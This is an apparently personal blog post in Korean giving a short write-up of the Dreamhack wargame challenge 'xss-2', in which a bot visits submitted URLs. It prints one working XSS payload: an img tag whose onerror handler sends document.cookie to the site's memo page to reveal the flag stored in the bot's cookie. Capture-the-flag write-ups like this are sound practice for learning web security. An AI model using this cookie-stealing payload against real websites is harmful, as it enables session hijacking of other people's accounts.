---
title : "드림핵 워게임 xss-2"
tags : 
date : "2026-02-01"
bookmark :  true
---

# 문제 설명
-------------
여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다.
XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.

플래그 형식은 DH{...} 입니다.

**홈 화면**
![설명]({{ 'assets\img\xss2_0.png' | relative_url }})

**vuln page**
![설명]({{ 'assets\img\xss2_1.png' | relative_url }})

**memo page**
![설명]({{ 'assets\img\xss2_2.png' | relative_url }})

**flag page**
![설명]({{ 'assets\img\xss2_3.png' | relative_url }})


# 문제 풀이
-------------

flag 페이지에 들어가 img src 태그를 사용하여 익스플로잇 코드를 작성한다. img src에 잘못된 값을 넣어 onerror가 작동하도록 하여 memo페이지에 사용자의 cookie값이 나오도록 한다.

`<img src="XSS-2" onerror="location.href='/memo?memo=' + document.cookie">
`

![설명]({{ 'assets\img\xss2_4.png' | relative_url }})

익스플로잇값을 작성하고 제출하면 alert창에 good이 뜬다.

![설명]({{ 'assets\img\xss2_5.png' | relative_url }})

다시 home으로 가서 memo 페이지를 들어가면,


![설명]({{ 'assets\img\xss2_6.png' | relative_url }})

플래그값을 얻을 수 있다.

